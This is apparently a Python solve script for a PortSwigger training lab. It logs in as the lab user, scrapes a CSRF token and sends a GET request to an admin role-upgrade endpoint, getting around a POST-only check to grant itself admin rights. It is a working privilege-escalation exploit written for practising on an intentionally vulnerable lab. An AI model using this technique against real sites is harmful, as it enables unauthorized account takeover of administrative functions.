#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Method-based access control can be circumvented.

Logs in as wiener and sends GET /admin-roles?username=wiener&action=upgrade
to bypass the POST-only role check.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_csrf(session: requests.Session, url: str) -> str:
    r = session.get(url)
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not m:
        raise SystemExit("[-] CSRF token not found")
    return m.group(1)


def login(session: requests.Session, lab: str, username: str, password: str) -> None:
    csrf = get_csrf(session, f"{lab}/login")
    r = session.post(f"{lab}/login", data={"csrf": csrf, "username": username, "password": password})
    if "Invalid username" in r.text:
        raise SystemExit(f"[-] Login failed for {username}")
    print(f"[*] Logged in as {username}")


def main():
    parser = argparse.ArgumentParser(
        description="Solve Access Control Lab 11 (method-based bypass)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--username", default="wiener")
    parser.add_argument("--password", default="peter")
    parser.add_argument("--target-user", default="wiener", help="User to upgrade")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    login(s, lab, args.username, args.password)

    print(f"[*] Sending GET /admin-roles?username={args.target_user}&action=upgrade")
    r = s.get(f"{lab}/admin-roles", params={"username": args.target_user, "action": "upgrade"})
    print(f"[*] Response status: {r.status_code}")

    if r.status_code in (200, 302):
        print("[+] Upgrade sent — verifying...")
        r2 = s.get(f"{lab}/my-account")
        if "Admin" in r2.text or "admin" in r2.text:
            print("[+] Lab solved — wiener is now admin")
        else:
            print("[?] Check /my-account manually")
    else:
        print(f"[-] Unexpected status {r.status_code}")


if __name__ == "__main__":
    main()
